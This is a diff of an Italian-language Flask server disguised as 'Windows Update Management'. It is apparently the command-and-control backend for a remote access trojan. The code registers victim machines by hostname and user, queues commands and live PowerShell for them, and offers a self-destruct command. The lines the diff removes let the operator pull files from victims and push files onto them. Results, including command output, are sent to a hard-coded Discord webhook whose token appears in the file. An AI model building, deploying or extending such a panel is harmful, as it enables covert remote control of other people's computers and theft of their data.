@@ -13,11 +13,11 @@ app = Flask(__name__)
 
 # Configurazione
 DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1435284134162464900/avJVpeaibF4iQyUlrD73-2JFZvpmNtZWeX-Cmbot3QU3tadH1wxjuOuZ-c7f9FsckPSt"
-CURRENT_VERSION = "4.0-light"
+CURRENT_VERSION = "5.1-final"
 
 # Settings logging
-MAX_LOG_FILES = 50
-LOG_RETENTION_HOURS = 24
+MAX_LOG_FILES = 100
+LOG_RETENTION_HOURS = 72
 
 class ClientManager:
     def __init__(self):
@@ -29,7 +29,6 @@ class ClientManager:
     
     def get_or_create_client(self, device_id, client_data):
         with self.lock:
-            # Client esistente
             if device_id in self.device_to_client:
                 client_id = self.device_to_client[device_id]
                 
@@ -45,7 +44,6 @@ class ClientManager:
                 
                 return client_id
             
-            # Nuovo client
             else:
                 client_id = f"C{self.client_counter}"
                 self.client_counter += 1
@@ -59,9 +57,8 @@ class ClientManager:
                 
                 self.device_to_client[device_id] = client_id
                 
-                # Notifica Discord
                 send_to_discord(
-                    f"🆕 **Nuovo Client** {client_id}\n"
+                    f"🆕 **Nuovo Client** `{client_id}`\n"
                     f"**Host:** {client_data.get('hostname', 'Unknown')}\n"
                     f"**User:** {client_data.get('username', 'Unknown')}"
                 )
@@ -101,19 +98,17 @@ class ClientManager:
                     "os": info.get("os", "Unknown"),
                     "device_id": info.get("device_id", "Unknown"),
                     "last_seen": info.get("last_seen").isoformat() if info.get("last_seen") else "Unknown",
-                    "active_users": info.get("active_users", [])
+                    "first_seen": info.get("first_seen").isoformat() if info.get("first_seen") else "Unknown"
                 }
             return result
     
     def has_command(self, client_id):
-        """Check if client has pending commands"""
         with self.lock:
             return client_id in self.commands_queue and bool(self.commands_queue[client_id])
 
 client_manager = ClientManager()
 
 def send_to_discord(message):
-    """Invia a Discord - SEMPRE ATTIVO"""
     if not DISCORD_WEBHOOK:
         return
     
@@ -123,40 +118,71 @@ def send_to_discord(message):
     except:
         pass
 
+def format_for_discord(text, max_length=1500):
+    """Formatta testo per Discord con split intelligente"""
+    if not text or len(str(text)) <= max_length:
+        return str(text)
+    
+    # Se è JSON, prova a renderlo leggibile
+    if isinstance(text, str) and (text.startswith('{') or text.startswith('[')):
+        try:
+            data = json.loads(text)
+            formatted = json.dumps(data, indent=2, ensure_ascii=False)
+            if len(formatted) > max_length:
+                return formatted[:max_length-100] + "\n... (troncato)"
+            return formatted
+        except:
+            pass
+    
+    # Split per linee se possibile
+    lines = str(text).split('\n')
+    if len(lines) > 1:
+        result = []
+        current_length = 0
+        for line in lines:
+            if current_length + len(line) + 1 > max_length - 100:
+                result.append("... (troncato)")
+                break
+            result.append(line)
+            current_length += len(line) + 1
+        return '\n'.join(result)
+    
+    # Troncamento semplice
+    return str(text)[:max_length-100] + "\n... (troncato)"
+
 def save_result(data):
-    """Salva risultato con rotazione automatica"""
+    """Salva risultato con directory creation"""
     try:
-        # Crea directory se non esiste
         os.makedirs("results", exist_ok=True)
         
-        # Salva file
         timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
         client_id = data.get('client_id', 'unknown')
         filename = f"results/result_{client_id}_{timestamp}.json"
         
-        with open(filename, 'w') as f:
-            json.dump(data, f, indent=2)
+        with open(filename, 'w', encoding='utf-8') as f:
+            json.dump(data, f, indent=2, ensure_ascii=False)
         
-        # Auto-cleanup
         cleanup_old_files()
+        
+        return filename
         
     except Exception as e:
         send_to_discord(f"❌ Errore salvataggio: {str(e)[:200]}")
+        return None
 
 def cleanup_old_files():
-    """Cancella file vecchi >24h e mantiene max 50 file"""
     try:
         cutoff = time.time() - (LOG_RETENTION_HOURS * 3600)
         
-        # Results files
         results_files = sorted(glob.glob("results/*.json"), key=os.path.getmtime)
         
-        # Cancella vecchi
         for f in results_files:
             if os.path.getmtime(f) < cutoff:
-                os.remove(f)
+                try:
+                    os.remove(f)
+                except:
+                    pass
         
-        # Mantieni max 50 file
         if len(results_files) > MAX_LOG_FILES:
             for f in results_files[:-MAX_LOG_FILES]:
                 try:
@@ -168,207 +194,249 @@ def cleanup_old_files():
         print(f"Cleanup error: {e}")
 
 # ============================================
-# 🏠 PAGINE WEB
+# 🏠 PAGINE WEB CON FIX
 # ============================================
 
 @app.route('/')
 def home():
+    os.makedirs("results", exist_ok=True)
     clients = client_manager.list_clients()
+    
     return f"""
-    <h1>Windows Update Management v{CURRENT_VERSION}</h1>
-    <p>Client attivi: {len(clients)}</p>
-    <p><a href="/admin">Admin Panel</a></p>
+    <html>
+    <head><title>Windows Update Management v{CURRENT_VERSION}</title>
+    <style>
+        body {{ font-family: Arial; margin: 20px; }}
+        .card {{ background: #f8f9fa; padding: 20px; border-radius: 10px; margin: 20px 0; }}
+        .stats {{ display: flex; gap: 20px; }}
+        .stat {{ background: white; padding: 15px; border-radius: 8px; flex: 1; text-align: center; }}
+        a {{ color: #007bff; text-decoration: none; }}
+        a:hover {{ text-decoration: underline; }}
+    </style>
+    </head>
+    <body>
+        <h1>🖥️ Windows Update Management v{CURRENT_VERSION}</h1>
+        
+        <div class="card">
+            <div class="stats">
+                <div class="stat"><h3>👥 Client Attivi</h3><p style="font-size: 24px; font-weight: bold;">{len(clients)}</p></div>
+                <div class="stat"><h3>📊 File Log</h3><p style="font-size: 24px; font-weight: bold;">{len(glob.glob('results/*.json'))}</p></div>
+            </div>
+            
+            <div style="margin-top: 20px;">
+                <p><a href="/admin" style="background: #007bff; color: white; padding: 10px 20px; border-radius: 5px; display: inline-block;">📋 Pannello Admin</a></p>
+                <p><a href="/logs" style="background: #28a745; color: white; padding: 10px 20px; border-radius: 5px; display: inline-block;">📄 Visualizza Log</a></p>
+            </div>
+        </div>
+    </body>
+    </html>
     """
+
+@app.route('/logs')
+def view_logs():
+    """Pagina log con fix directory vuota"""
+    try:
+        os.makedirs("results", exist_ok=True)
+        log_files = sorted(glob.glob("results/*.json"), key=os.path.getmtime, reverse=True)
+        
+        files_list = ""
+        for i, log_file in enumerate(log_files[:50]):
+            filename = os.path.basename(log_file)
+            size_kb = os.path.getsize(log_file) / 1024
+            mtime = datetime.fromtimestamp(os.path.getmtime(log_file))
+            
+            try:
+                with open(log_file, 'r', encoding='utf-8') as f:
+                    data = json.load(f)
+                client_id = data.get('client_id', 'N/A')
+                command = data.get('command', 'N/A')
+            except:
+                client_id = "Errore lettura"
+                command = "N/A"
+            
+            files_list += f'''
+            <tr>
+                <td>{i+1}</td>
+                <td><a href="/view_log/{filename}">{filename}</a></td>
+                <td>{client_id}</td>
+                <td><code>{command[:30]}{'...' if len(command) > 30 else ''}</code></td>
+                <td>{mtime.strftime('%Y-%m-%d %H:%M')}</td>
+                <td>{size_kb:.1f} KB</td>
+            </tr>
+            '''
+        
+        if not files_list:
+            files_list = '<tr><td colspan="6" style="text-align: center; padding: 20px; color: #666;">📭 Nessun log disponibile</td></tr>'
+        
+        return f'''
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Log Client - v{CURRENT_VERSION}</title>
+            <style>
+                body {{ font-family: Arial; margin: 20px; }}
+                table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
+                th, td {{ border: 1px solid #ddd; padding: 10px; text-align: left; }}
+                th {{ background-color: #f2f2f2; }}
+                tr:hover {{ background-color: #f5f5f5; }}
+                .header {{ background: #343a40; color: white; padding: 20px; border-radius: 8px; }}
+                code {{ background: #e8f4fc; padding: 2px 5px; border-radius: 3px; }}
+            </style>
+        </head>
+        <body>
+            <div class="header">
+                <h1>📄 Log Client</h1>
+                <p><a href="/" style="color: #80bdff;">🏠 Home</a> | <a href="/admin" style="color: #80bdff;">📋 Admin Panel</a></p>
+            </div>
+            
+            <h3>Ultimi 50 log:</h3>
+            <table>
+                <tr><th>#</th><th>File</th><th>Client ID</th><th>Comando</th><th>Data/Ora</th><th>Dimensione</th></tr>
+                {files_list}
+            </table>
+        </body>
+        </html>
+        '''
+        
+    except Exception as e:
+        return f"<h2>Errore caricamento log: {str(e)}</h2>"
+
+@app.route('/view_log/<log_filename>')
+def view_single_log(log_filename):
+    """Visualizza singolo log - FIX parametro"""
+    try:
+        filepath = os.path.join("results", log_filename)
+        
+        if not os.path.exists(filepath):
+            return f"<h2>File non trovato: {log_filename}</h2>"
+        
+        with open(filepath, 'r', encoding='utf-8') as f:
+            data = json.load(f)
+        
+        formatted_json = json.dumps(data, indent=2, ensure_ascii=False)
+        
+        client_id = data.get('client_id', 'N/A')
+        command = data.get('command', 'N/A')
+        timestamp = data.get('timestamp', time.time())
+        dt = datetime.fromtimestamp(timestamp)
+        
+        return f'''
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Log: {log_filename}</title>
+            <style>
+                body {{ font-family: Arial; margin: 20px; }}
+                pre {{ background: #f5f5f5; padding: 15px; border-radius: 5px; overflow: auto; max-height: 80vh; }}
+                .info {{ background: #e8f4fc; padding: 15px; border-radius: 5px; margin-bottom: 20px; }}
+                a {{ color: #007bff; text-decoration: none; }}
+            </style>
+        </head>
+        <body>
+            <h1>📄 Log: {log_filename}</h1>
+            
+            <div class="info">
+                <p><strong>Client ID:</strong> {client_id}</p>
+                <p><strong>Comando:</strong> <code>{command}</code></p>
+                <p><strong>Data/Ora:</strong> {dt.strftime('%Y-%m-%d %H:%M:%S')}</p>
+                <p><strong>Dimensione:</strong> {os.path.getsize(filepath) / 1024:.1f} KB</p>
+                <p><a href="/logs">⬅ Torna alla lista log</a> | <a href="/admin">📋 Admin Panel</a></p>
+            </div>
+            
+            <h3>Contenuto JSON:</h3>
+            <pre>{formatted_json}</pre>
+        </body>
+        </html>
+        '''
+        
+    except Exception as e:
+        return f"<h2>Errore lettura file: {str(e)}</h2>"
 
 @app.route('/admin')
 def admin_panel():
     clients = client_manager.list_clients()
     
-    # Genera opzioni client
     clients_options = ""
     for client_id, info in clients.items():
         display = f"{client_id} - {info['hostname']} ({info['username']})"
         clients_options += f'<option value="{client_id}">{display}</option>'
     
-    # Genera tabella client
     clients_rows = ""
     for client_id, info in clients.items():
-        last_seen = info['last_seen']
-        if 'T' in last_seen:
-            last_seen = last_seen.split('T')[0]
-        
-        # Badge utenti attivi
-        active_users = info.get('active_users', [])
-        user_badge = ""
-        if active_users:
-            user_count = len(active_users)
-            user_badge = f' <span style="background:#4CAF50;color:white;padding:2px 6px;border-radius:10px;font-size:12px;">👤{user_count}</span>'
-        
-        # Tooltip lista utenti
-        users_list = ", ".join(active_users) if active_users else "Nessun utente attivo"
-        user_tooltip = f' title="Utenti attivi: {users_list}"' if active_users else ""
+        last_seen = info['last_seen'][11:19] if 'T' in info['last_seen'] else info['last_seen']
+        first_seen = info.get('first_seen', 'N/A')
+        if 'T' in str(first_seen):
+            first_seen = str(first_seen).split('T')[0]
         
         clients_rows += f"""
-        <tr{user_tooltip}>
-            <td>{client_id}{user_badge}</td>
+        <tr>
+            <td>{client_id}</td>
             <td>{info['hostname']}</td>
             <td>{info['username']}</td>
             <td>{info['os']}</td>
+            <td>{first_seen}</td>
             <td>{last_seen}</td>
             <td>
                 <form action="/api/send_command" method="post" style="display: inline;">
                     <input type="hidden" name="client_id" value="{client_id}">
                     <input type="hidden" name="command" value="get_info">
                     <input type="hidden" name="target_user" value="SYSTEM">
-                    <button type="submit" style="padding: 3px 8px; font-size: 12px;">Info</button>
+                    <button type="submit" style="padding: 3px 8px; font-size: 12px; background: #17a2b8; color: white; border: none; border-radius: 3px; cursor: pointer;">Info</button>
                 </form>
                 <form action="/api/send_command" method="post" style="display: inline;">
                     <input type="hidden" name="client_id" value="{client_id}">
                     <input type="hidden" name="command" value="self_destruct">
                     <input type="hidden" name="target_user" value="SYSTEM">
-                    <button type="submit" style="padding: 3px 8px; font-size: 12px; background: #dc3545;">💣</button>
-                </form>
-                <form action="/api/remove_client" method="post" style="display: inline;">
-                    <input type="hidden" name="client_id" value="{client_id}">
-                    <button type="submit" style="padding: 3px 8px; font-size: 12px; background: #6c757d;">🗑️</button>
+                    <button type="submit" style="padding: 3px 8px; font-size: 12px; background: #dc3545; color: white; border: none; border-radius: 3px; cursor: pointer;">💣</button>
                 </form>
             </td>
         </tr>
         """
     
     if not clients_rows:
-        clients_rows = '<tr><td colspan="6">Nessun client connesso</td></tr>'
+        clients_rows = '<tr><td colspan="7">Nessun client connesso</td></tr>'
     
     return f'''
     <!DOCTYPE html>
     <html>
     <head>
-        <title>Update Admin Panel</title>
+        <title>Admin Panel - v{CURRENT_VERSION}</title>
         <style>
             body {{ font-family: Arial; margin: 20px; }}
-            .section {{ margin: 20px 0; padding: 15px; border: 1px solid #ccc; }}
-            button {{ padding: 10px 20px; background: #007bff; color: white; border: none; cursor: pointer; }}
+            .section {{ margin: 20px 0; padding: 20px; border: 1px solid #dee2e6; border-radius: 8px; }}
+            button {{ padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }}
             button:hover {{ background: #0056b3; }}
             table {{ width: 100%; border-collapse: collapse; }}
-            th, td {{ border: 1px solid #ddd; padding: 8px; }}
-            th {{ background: #f2f2f2; }}
-            .user-badge {{ background: #4CAF50; color: white; padding: 2px 6px; border-radius: 10px; font-size: 12px; }}
-            .global-config {{ background: #e8f4fc; padding: 15px; margin-bottom: 20px; border-radius: 5px; border: 1px solid #b3d9ff; }}
+            th, td {{ border: 1px solid #dee2e6; padding: 10px; }}
+            th {{ background: #f8f9fa; }}
+            input, select, textarea {{ width: 100%; padding: 8px; margin: 5px 0; border: 1px solid #ced4da; border-radius: 4px; }}
+            .nav {{ margin-bottom: 20px; }}
+            .nav a {{ margin-right: 15px; color: #007bff; text-decoration: none; }}
         </style>
     </head>
     <body>
-        <h2>Windows Update Management Panel</h2>
-        
-        <!-- 👥 CONFIGURAZIONE GLOBALE UTENTI -->
-        <div class="global-config">
-            <h3 style="margin-top: 0;">🎯 Configurazione Target Utente</h3>
-            <p>Seleziona l'utente target per tutti i comandi successivi:</p>
-            
-            <select id="globalUserTarget" style="padding: 8px; min-width: 200px;">
-                <option value="SYSTEM">SYSTEM (Tutti gli utenti - Default)</option>
-                <!-- Le opzioni verranno populate da JavaScript -->
-            </select>
-            
-            <button onclick="applyGlobalUser()" style="padding: 8px 15px; margin-left: 10px;">
-                Applica a Tutti i Form
-            </button>
-            
-            <div id="globalUserStatus" style="margin-top: 10px; font-size: 14px; color: #666;">
-                Stato: <strong>SYSTEM (tutti gli utenti)</strong>
-            </div>
-            
-            <script>
-            // Raccogli tutti gli utenti unici da tutti i client
-            function collectAllUsers() {{
-                const allUsers = new Set(['SYSTEM']);
-                // Itera su tutte le righe della tabella
-                document.querySelectorAll('tr[title*="Utenti attivi:"]').forEach(row => {{
-                    const title = row.getAttribute('title');
-                    if (title) {{
-                        const usersStr = title.replace('Utenti attivi: ', '');
-                        if (usersStr !== 'Nessun utente attivo') {{
-                            usersStr.split(', ').forEach(user => {{
-                                if (user.trim()) allUsers.add(user.trim());
-                            }});
-                        }}
-                    }}
-                }});
-                return Array.from(allUsers).sort();
-            }}
-            
-            // Popola il dropdown
-            function populateUserDropdown() {{
-                const select = document.getElementById('globalUserTarget');
-                const users = collectAllUsers();
-                
-                // Pulisci opzioni eccetto SYSTEM
-                while (select.options.length > 1) {{
-                    select.remove(1);
-                }}
-                
-                // Aggiungi utenti (escludi SYSTEM già presente)
-                users.forEach(user => {{
-                    if (user !== 'SYSTEM') {{
-                        const option = document.createElement('option');
-                        option.value = user;
-                        option.textContent = user;
-                        select.appendChild(option);
-                    }}
-                }});
-            }}
-            
-            // Applica selezione a tutti i form
-            function applyGlobalUser() {{
-                const targetUser = document.getElementById('globalUserTarget').value;
-                
-                // Aggiorna tutti i campi hidden target_user
-                document.querySelectorAll('input[name="target_user"]').forEach(input => {{
-                    input.value = targetUser;
-                }});
-                
-                // Feedback visivo
-                document.getElementById('globalUserStatus').innerHTML = 
-                    `Stato: <strong>${{targetUser}} (${{targetUser === 'SYSTEM' ? 'tutti gli utenti' : 'utente specifico'}})</strong>`;
-                
-                // Salva per la sessione
-                sessionStorage.setItem('globalTargetUser', targetUser);
-                
-                alert(`✅ Tutti i prossimi comandi saranno inviati a: ${{targetUser}}`);
-            }}
-            
-            // Al caricamento
-            document.addEventListener('DOMContentLoaded', function() {{
-                populateUserDropdown();
-                
-                // Ripristina selezione salvata
-                const saved = sessionStorage.getItem('globalTargetUser');
-                if (saved) {{
-                    document.getElementById('globalUserTarget').value = saved;
-                    applyGlobalUser();
-                }}
-            }});
-            </script>
+        <div class="nav">
+            <a href="/">🏠 Home</a>
+            <a href="/logs">📄 Log</a>
+            <strong>📋 Admin Panel</strong>
         </div>
         
+        <h2>Windows Update Management Panel</h2>
+        
         <div class="section">
-            <h3>📋 Comandi Predefiniti</h3>
+            <h3>📋 Comandi</h3>
             <form action="/api/send_command" method="post">
                 <label>Client:</label><br>
-                <select name="client_id" style="width: 100%; padding: 5px;">
-                    {clients_options}
-                </select><br><br>
-                
+                <select name="client_id">{clients_options}</select><br><br>
                 <input type="hidden" name="target_user" value="SYSTEM">
-                
                 <label>Comando:</label><br>
-                <select name="command" style="width: 100%; padding: 5px;">
+                <select name="command">
                     <option value="systeminfo">System Information</option>
                     <option value="list_files">List Files</option>
                     <option value="active_users">Active Users</option>
                     <option value="get_info">Client Info</option>
                     <option value="self_destruct">💣 Self Destruct</option>
                 </select><br><br>
-                
                 <button type="submit">Invia Comando</button>
             </form>
         </div>
@@ -377,74 +445,21 @@ def admin_panel():
             <h3>⚡ PowerShell Live</h3>
             <form action="/api/send_powershell" method="post">
                 <label>Client:</label><br>
-                <select name="client_id" style="width: 100%; padding: 5px;">
-                    {clients_options}
-                </select><br><br>
-                
+                <select name="client_id">{clients_options}</select><br><br>
                 <input type="hidden" name="target_user" value="SYSTEM">
-                
-                <label>Comando:</label><br>
-                <textarea name="command" rows="3" style="width: 100%;" placeholder="Get-Process"></textarea><br><br>
-                
+                <label>Comando PowerShell:</label><br>
+                <textarea name="command" rows="3" placeholder="Get-Process | Select -First 5"></textarea><br><br>
                 <button type="submit">Esegui PowerShell</button>
-            </form>
-        </div>
-        
-        <div class="section">
-            <h3>📥 Download File</h3>
-            <form action="/api/request_download" method="post">
-                <label>Client:</label><br>
-                <select name="client_id" style="width: 100%; padding: 5px;">
-                    {clients_options}
-                </select><br><br>
-                
-                <input type="hidden" name="target_user" value="SYSTEM">
-                
-                <label>Percorso file:</label><br>
-                <input type="text" name="filepath" style="width: 100%; padding: 5px;" 
-                       placeholder="C:\\Users\\{{user}}\\Desktop\\file.txt  oppure  C:\\Windows\\System32\\..."><br><br>
-                
-                <button type="submit">Richiedi Download</button>
-            </form>
-        </div>
-        
-        <div class="section">
-            <h3>📤 Upload File</h3>
-            <form action="/api/prepare_upload" method="post">
-                <label>Client:</label><br>
-                <select name="client_id" style="width: 100%; padding: 5px;">
-                    {clients_options}
-                </select><br><br>
-                
-                <input type="hidden" name="target_user" value="SYSTEM">
-                
-                <label>File sul server:</label><br>
-                <input type="text" name="server_path" style="width: 100%; padding: 5px;" placeholder="uploads/file.txt"><br><br>
-                
-                <label>Destinazione client:</label><br>
-                <input type="text" name="client_path" style="width: 100%; padding: 5px;" 
-                       placeholder="C:\\Users\\{{user}}\\Desktop\\file.txt"><br><br>
-                
-                <button type="submit">Prepara Upload</button>
             </form>
         </div>
         
         <div class="section">
             <h3>📊 Client Attivi ({len(clients)})</h3>
             <table>
-                <tr>
-                    <th>ID</th>
-                    <th>Hostname</th>
-                    <th>User</th>
-                    <th>OS</th>
-                    <th>Ultimo visto</th>
-                    <th>Azioni</th>
-                </tr>
+                <tr><th>ID</th><th>Hostname</th><th>User</th><th>OS</th><th>Prima connessione</th><th>Ultimo visto</th><th>Azioni</th></tr>
                 {clients_rows}
             </table>
         </div>
-        
-        <p><a href="/">Home</a></p>
     </body>
     </html>
     '''
@@ -457,18 +472,13 @@ def admin_panel():
 def register_client():
     try:
         data = request.json
-        
         if not data or 'device_id' not in data:
             return jsonify({"status": "error", "message": "device_id required"}), 400
         
         device_id = data['device_id']
         client_id = client_manager.get_or_create_client(device_id, data)
         
-        return jsonify({
-            "status": "success",
-            "client_id": client_id,
-            "message": "Client registered"
-        })
+        return jsonify({"status": "success", "client_id": client_id})
         
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 500
@@ -482,18 +492,13 @@ def heartbeat():
         if not client_id or not device_id:
             return jsonify({"status": "error", "message": "Missing params"}), 400
         
-        # Verifica client
         with client_manager.lock:
             if client_id not in client_manager.clients:
                 return jsonify({"status": "reregister", "message": "Client not found"}), 404
         
-        # Controlla comandi
-        command_exists = client_manager.has_command(client_id)
-        
-        if command_exists:
+        if client_manager.has_command(client_id):
             return jsonify({"status": "command_available", "message": "Command waiting"})
         else:
-            # Aggiorna last_seen
             with client_manager.lock:
                 if client_id in client_manager.clients:
                     client_manager.clients[client_id]["last_seen"] = datetime.now()
@@ -503,42 +508,17 @@ def heartbeat():
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 500
 
-@app.route('/api/remove_client', methods=['POST'])
-def remove_client_endpoint():
-    """Rimuove client manualmente dal pannello"""
-    try:
-        client_id = request.form.get('client_id')
-        
-        if not client_id:
-            return "Errore: client_id mancante", 400
-        
-        # Rimuovi client
-        client_manager.remove_client(client_id)
-        
-        # Notifica Discord
-        send_to_discord(f"🗑️ Client {client_id} rimosso manualmente dal pannello")
-        
-        return f'''
-        <h3>Client Rimosso!</h3>
-        <p>Client {client_id} è stato rimosso dal sistema.</p>
-        <p><a href="/admin">Torna al Panel</a></p>
-        '''
-        
-    except Exception as e:
-        return f"Errore: {str(e)}", 500
-
 @app.route('/api/get_command', methods=['GET'])
 def get_command():
     try:
         client_id = request.args.get('client_id')
-        
         if not client_id:
             return jsonify({"status": "error", "message": "client_id required"}), 400
         
         command = client_manager.get_command(client_id)
         
         if command:
-            send_to_discord(f"📤 Invio comando a {client_id}: {command[:100]}")
+            send_to_discord(f"📤 Invio comando a `{client_id}`: `{command[:100]}`")
             return jsonify({"status": "success", "command": command})
         else:
             return jsonify({"status": "no_command", "message": "No commands"})
@@ -550,7 +530,6 @@ def get_command():
 def receive_results():
     try:
         data = request.json
-        
         if not data:
             return jsonify({"status": "error", "message": "No data"}), 400
         
@@ -558,16 +537,30 @@ def receive_results():
         command = data.get('command', 'unknown')
         results = data.get('results', {})
         
-        # Salva su file (con rotazione)
-        save_result(data)
+        filename = save_result(data)
         
-        # Log su Discord
-        result_preview = str(results)[:500]
-        send_to_discord(f"📊 Risultati da {client_id}\nComando: {command}\nRisultato: {result_preview}")
+        # Formatta per Discord
+        result_str = ""
+        if isinstance(results, dict):
+            if 'stdout' in results:
+                result_str = format_for_discord(results.get('stdout', ''))
+            elif 'hostname' in results:
+                result_str = f"Hostname: {results.get('hostname')}\nUser: {results.get('username')}\nOS: {results.get('os')}"
+            else:
+                result_str = format_for_discord(str(results))
+        else:
+            result_str = format_for_discord(str(results))
+        
+        discord_msg = f"📊 **Risultati da** `{client_id}`\n"
+        discord_msg += f"**Comando:** `{command}`\n"
+        discord_msg += f"```\n{result_str}\n```"
+        
+        send_to_discord(discord_msg)
         
         return jsonify({"status": "success", "message": "Results received"})
         
     except Exception as e:
+        send_to_discord(f"❌ Errore ricezione risultati: {str(e)[:200]}")
         return jsonify({"status": "error", "message": str(e)}), 500
 
 @app.route('/api/send_command', methods=['POST'])
@@ -580,22 +573,19 @@ def send_command():
         if not client_id or not command:
             return "Errore: parametri mancanti", 400
         
-        # Se target_user specificato, modifica comando
         final_command = command
         if target_user != "SYSTEM":
-            # Aggiungi prefisso per identificare utente target
             final_command = f"user_{target_user}:{command}"
         
         client_manager.add_command(client_id, final_command)
-        send_to_discord(f"🌐 Comando '{command}' per {client_id}" + 
-                       (f" (utente: {target_user})" if target_user != "SYSTEM" else ""))
+        
+        send_to_discord(f"🌐 Comando `{command}` inviato a `{client_id}`")
         
         return f'''
-        <h3>Comando Inviato!</h3>
-        <p>Client: {client_id}</p>
-        <p>Comando: {command}</p>
-        <p>Utente Target: {target_user if target_user != "SYSTEM" else "SYSTEM (tutti)"}</p>
-        <p><a href="/admin">Torna al Panel</a></p>
+        <h3>✅ Comando Inviato!</h3>
+        <p><strong>Client:</strong> <code>{client_id}</code></p>
+        <p><strong>Comando:</strong> <code>{command}</code></p>
+        <p><a href="/admin">↶ Torna al Panel</a></p>
         '''
         
     except Exception as e:
@@ -611,106 +601,18 @@ def send_powershell():
         if not client_id or not ps_command:
             return "Errore: parametri mancanti", 400
         
-        # Aggiungi info utente al comando
         final_command = f"powershell_live:{ps_command}"
         if target_user != "SYSTEM":
             final_command = f"user_{target_user}:powershell_live:{ps_command}"
         
         client_manager.add_command(client_id, final_command)
         
-        send_to_discord(f"⚡ PowerShell per {client_id}" + 
-                       (f" (utente: {target_user})" if target_user != "SYSTEM" else "") + 
-                       f": {ps_command[:100]}")
+        send_to_discord(f"⚡ PowerShell inviato a `{client_id}`")
         
         return f'''
-        <h3>PowerShell Inviato!</h3>
-        <p>Client: {client_id}</p>
-        <p>Comando: {ps_command}</p>
-        <p>Utente Target: {target_user if target_user != "SYSTEM" else "SYSTEM (tutti)"}</p>
-        <p><a href="/admin">Torna al Panel</a></p>
-        '''
-        
-    except Exception as e:
-        return f"Errore: {str(e)}", 500
-
-@app.route('/api/request_download', methods=['POST'])
-def request_download():
-    try:
-        client_id = request.form.get('client_id')
-        filepath = request.form.get('filepath')
-        target_user = request.form.get('target_user', 'SYSTEM')
-        
-        if not client_id or not filepath:
-            return "Errore: parametri mancanti", 400
-        
-        # Sostituisci {user} nel path se target_user specificato
-        final_filepath = filepath
-        if target_user != "SYSTEM" and "{user}" in filepath:
-            final_filepath = filepath.replace("{user}", target_user)
-        
-        command = f"download_file:{final_filepath}"
-        if target_user != "SYSTEM":
-            command = f"user_{target_user}:{command}"
-        
-        client_manager.add_command(client_id, command)
-        
-        send_to_discord(f"📥 Download richiesto da {client_id}" + 
-                       (f" (utente: {target_user})" if target_user != "SYSTEM" else "") + 
-                       f": {final_filepath}")
-        
-        return f'''
-        <h3>Download Richiesto!</h3>
-        <p>Client: {client_id}</p>
-        <p>File: {final_filepath}</p>
-        <p>Utente Target: {target_user if target_user != "SYSTEM" else "SYSTEM (tutti)"}</p>
-        <p><a href="/admin">Torna al Panel</a></p>
-        '''
-        
-    except Exception as e:
-        return f"Errore: {str(e)}", 500
-
-@app.route('/api/prepare_upload', methods=['POST'])
-def prepare_upload():
-    try:
-        client_id = request.form.get('client_id')
-        server_path = request.form.get('server_path')
-        client_path = request.form.get('client_path')
-        target_user = request.form.get('target_user', 'SYSTEM')
-        
-        if not all([client_id, server_path, client_path]):
-            return "Errore: parametri mancanti", 400
-        
-        # Sostituisci {user} nel path destinazione
-        final_client_path = client_path
-        if target_user != "SYSTEM" and "{user}" in client_path:
-            final_client_path = client_path.replace("{user}", target_user)
-        
-        # Leggi file
-        if not os.path.exists(server_path):
-            return f"Errore: file non trovato", 404
-        
-        with open(server_path, 'rb') as f:
-            content = f.read()
-        
-        base64_content = base64.b64encode(content).decode('utf-8')
-        
-        command = f"upload_file|{final_client_path}|{base64_content}"
-        if target_user != "SYSTEM":
-            command = f"user_{target_user}:{command}"
-        
-        client_manager.add_command(client_id, command)
-        
-        send_to_discord(f"📤 Upload a {client_id}" + 
-                       (f" (utente: {target_user})" if target_user != "SYSTEM" else "") + 
-                       f": {os.path.basename(server_path)} → {final_client_path}")
-        
-        return f'''
-        <h3>Upload Preparato!</h3>
-        <p>Client: {client_id}</p>
-        <p>File: {os.path.basename(server_path)}</p>
-        <p>Destinazione: {final_client_path}</p>
-        <p>Utente Target: {target_user if target_user != "SYSTEM" else "SYSTEM (tutti)"}</p>
-        <p><a href="/admin">Torna al Panel</a></p>
+        <h3>✅ PowerShell Inviato!</h3>
+        <p><strong>Client:</strong> <code>{client_id}</code></p>
+        <p><a href="/admin">↶ Torna al Panel</a></p>
         '''
         
     except Exception as e:
@@ -722,22 +624,20 @@ def list_clients_api():
     return jsonify({
         "status": "success",
         "count": len(clients),
-        "clients": clients
+        "clients": clients,
+        "server_version": CURRENT_VERSION
     })
 
 # ============================================
 # 🏁 AVVIO SERVER
 # ============================================
 if __name__ == '__main__':
-    # Crea directory
     os.makedirs("results", exist_ok=True)
     os.makedirs("uploads", exist_ok=True)
-    os.makedirs("downloads", exist_ok=True)
     
-    # Thread cleanup
     def cleanup_loop():
         while True:
-            time.sleep(3600)  # Ogni ora
+            time.sleep(3600)
             try:
                 cleanup_old_files()
             except:
@@ -745,4 +645,7 @@ if __name__ == '__main__':
     
     threading.Thread(target=cleanup_loop, daemon=True).start()
     
-    send_to_discord(f"🚀 Server v{CURRENT_VERSION} avviato")
+    send_to_discord(f"🚀 **Server v{CURRENT_VERSION} avviato**")
+    
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port, debug=False)
